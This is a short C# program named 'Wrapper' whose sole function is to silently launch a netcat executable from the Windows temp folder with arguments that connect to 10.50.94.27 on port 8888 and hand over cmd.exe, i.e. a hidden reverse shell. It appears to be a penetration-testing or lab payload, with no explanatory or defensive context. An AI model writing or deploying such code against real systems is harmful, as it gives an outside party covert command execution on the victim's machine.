using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
		Process proc = new Process();
		ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-kmrvivek06.exe", "10.50.94.27 8888 -e cmd.exe");
		procInfo.CreateNoWindow = true;
		proc.StartInfo = procInfo;
		proc.Start();
        }
    }
}
